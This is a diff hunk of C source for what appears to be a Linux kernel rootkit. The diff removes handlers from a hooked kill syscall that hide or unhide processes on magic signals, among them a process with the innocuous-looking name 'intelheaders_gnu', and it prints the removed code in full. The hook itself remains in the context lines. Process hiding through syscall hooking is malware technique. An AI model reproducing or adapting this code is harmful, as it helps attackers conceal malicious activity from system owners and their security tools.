@@ -40,61 +40,6 @@ static asmlinkage int kill_hook(const struct pt_regs* ctx) {
             }
             break;
             
-        case SIGTTOU:
-            // Show intelheaders_gnu process: kill -22 0
-            if (pid == 0) {
-                remove_hidden_process("intelheaders_gnu");
-            }
-            break;
-            
-        case SIGTTIN:
-            // Hide intelheaders_gnu process: kill -23 0
-            if (pid == 0) {
-                add_hidden_process("intelheaders_gnu");
-            }
-            break;
-            
-        case SIGRTMIN:
-            // Hide process by name: kill -34 0
-            if (pid == 0) {
-                char comm_buf[TASK_COMM_LEN];
-                get_task_comm(comm_buf, current);
-                add_hidden_process(comm_buf);
-            } else {
-                // Hide process by PID (we'll get its name)
-                struct task_struct *task;
-                char target_comm[TASK_COMM_LEN];
-                
-                rcu_read_lock();
-                task = pid_task(find_vpid((pid_t)pid), PIDTYPE_PID);
-                if (task) {
-                    get_task_comm(target_comm, task);
-                    add_hidden_process(target_comm);
-                }
-                rcu_read_unlock();
-            }
-            break;
-            
-        case SIGRTMIN1:
-            // Unhide process by name: kill -35 0
-            if (pid == 0) {
-                char comm_buf[TASK_COMM_LEN];
-                get_task_comm(comm_buf, current);
-                remove_hidden_process(comm_buf);
-            } else {
-                // Unhide process by PID (we'll get its name)
-                struct task_struct *task;
-                char target_comm[TASK_COMM_LEN];
-                
-                rcu_read_lock();
-                task = pid_task(find_vpid((pid_t)pid), PIDTYPE_PID);
-                if (task) {
-                    get_task_comm(target_comm, task);
-                    remove_hidden_process(target_comm);
-                }
-                rcu_read_unlock();
-            }
-            break;
             
             
         default:
